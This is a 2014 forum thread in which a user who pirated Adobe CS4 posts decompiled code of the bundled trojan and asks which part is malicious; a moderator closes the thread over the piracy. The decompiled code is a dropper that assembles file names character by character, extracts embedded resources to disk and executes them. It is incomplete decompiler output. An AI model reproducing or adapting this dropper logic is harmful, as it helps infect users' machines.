---
title: "Help with removing a trojan out of adobe cs4?"
date: 2014-05-15
forum: Any Other OS
---

### Post by Thomas_Absher on 2014-05-15
ok... i wanted to get adobe cs4 so... but i didn't want to pay for it... so i got it off of tpb. everyone said it worked but there was a Trojan. so, being myself, i wanted to outsmart the vicious troll, so i decompiled the virus... the only problem i had was that i don't know c... how can i rewrite the program to remove the virus. can someone tell me what part the Trojan is?
[B]__size32 global44 = 0x37167;// 4 bytes
__size32 global37 = 0;// 4 bytes
DWORD global35 = 0;
__size32 global34 = 0;// 4 bytes
union { int x161; LPDWORD x162; } global33;
__size32 global7 = 0;// 4 bytes
void _start(__size8 param1);
// address: 0x401564
__size8 proc11(long long param1, __size16 *param2, __size8 param3) {
    unsigned long long ah;   // r12
    unsigned long long al;   // r8
    char dl;   // r10
    __size8 dl_1;   // r10{92}
    unsigned long long eax;   // r24
    unsigned long long eax_1;   // r24{106}
    __size8 *edi;   // r31
    __size8 *edi_1;   // r31{108}
    unsigned long long *esi;   // r30
    __size8 local0;   // dl_1{92}
    unsigned long long local1;   // eax_1{106}
    __size8 local2;   // param3{114}
    edi = param2;
    eax = param1;
    local0 = param3;
    local2 = param3;
    if (param1 == 0) {
        *(__size16*)param2 = 48;
    } else {
        if (param1 < 0) {
            *(__size16*)param2 = 45;
            edi = param2 + 1;
            eax = 0 - param1;
        }
        esi = edi;
        dl_1 = local0;
        eax_1 = eax;
        local1 = eax_1;
        local2 = dl_1;
        while (eax_1 > 0) {
            eax = (eax_1) / 10;
            dl = (unsigned char) (eax_1) % 10;
            dl_1 = dl + 48;
            *(__size8*)edi = dl + 48;
            edi++;
            local0 = dl_1;
            dl_1 = local0;
            eax_1 = eax;
            local1 = eax_1;
            local2 = dl_1;
        }
        *(__size8*)edi = 0;
        eax_1 = local1;
        edi_1 = edi;
        while (esi < edi_1) {
            edi = edi_1 - 1;
            al = *esi;
            ah = *(edi_1 - 1);
            eax = (eax_1 >> 8 & 0xffffff | (al)) & 0xffff00ff | ah * 256;
            *(unsigned long long*)(edi_1 - 1) = al;
            *(unsigned long long*)esi = ah;
            esi++;
            local1 = eax;
            eax_1 = local1;
            edi_1 = edi;
        }
    }
    param3 = local2;
    return param3;
}
// address: 0x401000
void _start(__size8 param1) {
    __size8 dl;   // r10
    __size32 eax;   // r24
    long long eax_1;   // r24{249}
    long long eax_2;   // r24{432}
    LPCVOID local18;   // m[esp - 172]
    HANDLE local19;   // m[esp - 176]
    HANDLE local23;   // m[esp - 160]
    LPCVOID local37;   // m[esp - 248]
    HANDLE local38;   // m[esp - 252]
    HANDLE local42;   // m[esp - 236]
    LPSTR local45;   // m[esp - 264]
    GetModuleHandleA();
    global7 = eax;
    lstrcpyA();
    lstrcatA("", "p");
    lstrcatA("", "e");
    lstrcatA("", "n");
    StrChrIA();
    StrChrIA();
    GetKeyboardLayout();
    SHGetSpecialFolderPathA();
    StrStrA();
    lstrcpyA();
    lstrcatA("", "s");
    lstrcatA("", " ");
    GetKeyboardLayout();
    lstrcpyA();
    lstrcpyA();
    lstrcatA("", ".");
    lstrcatA("", "d");
    lstrcatA("", "l");
    lstrcatA("", "l");
    GetCurrentDirectoryA();
    lstrcpyA();
    lstrcatA("", "e");
    lstrcatA("", "g");
    lstrcatA("", "s");
    lstrcatA("", "v");
    lstrcatA("", "r");
    lstrcatA("", "3");
    lstrcatA("", "2");
    GetKeyboardLayout();
    RtlZeroMemory();
    GetTickCount();
    dl = proc11(eax_1, 0x403c0b, param1);
    Sleep(3);
    lstrcpyA();
    lstrcatA("\x14", "e");
    lstrcatA("\x14", "x");
    lstrcatA("\x14", "e");
    lstrcpyA();
    lstrcatA("", "\xa");
    lstrcatA("", "");
    lstrcatA("", "\x14");
    FindResourceA(0, 9, 391);
    global33 = eax;
    LoadResource(0, eax);
    LockResource(eax);
    global34 = eax;
    SizeofResource(0, global33);
    global35 = eax;
    CreateFileA();
    if (eax != -1) {
        global37 = eax;
        local18 = *0x4041a7;
        local19 = *0x40418f;
        WriteFile(local19, local18, global35, 0x40419f, 0);
        local23 = *0x40418f;
        CloseHandle(local23);
    }
    Sleep(184);
    lstrcpyA();
    RtlZeroMemory();
    GetTickCount();
    proc11(eax_2, 0x403c0b, dl);
    lstrcpyA();
    lstrcatA("", "\xa");
    lstrcatA("", "");
    lstrcatA("", "\x14");
    CopyFileA();
    ShellExecuteA(0, "", "", 0, "", 5);
    Sleep(76);
    FindResourceA(0, 5, 355);
    global33 = eax;
    LoadResource(0, eax);
    LockResource(eax);
    global34 = eax;
    SizeofResource(0, global33);
    global35 = eax;
    lstrcpyA();
    lstrcatA("", "\");
    lstrcatA("", "");
    lstrlenA();
    global44 = eax;
    CreateFileA();
    if (eax != -1) {
        global37 = eax;
        local37 = *0x4041a7;
        local38 = *0x40418f;
        WriteFile(local38, local37, global35, 0x40419f, 0);
        local42 = *0x40418f;
        CloseHandle(local42);
    }
    lstrcpyA();
    lstrcatA("", "\");
    lstrcatA("", "x");
    lstrcatA("", "");
    CopyFileA();
    lstrcpyA();
    lstrcatA("", "");
    Sleep(0x4b30);
    ShellExecuteA(0, "", "", "", 0, 5);
    local45 = *0x4042b0;
    CloseHandle(local45);
    ExitProcess(eax);
    return;
}
 
[/B]

---

### Post by Irihapeti on 2014-05-15
We don't support any circumvention of Terms of Service, EULAs or similar restrictions on this forum.

Thread closed.

---

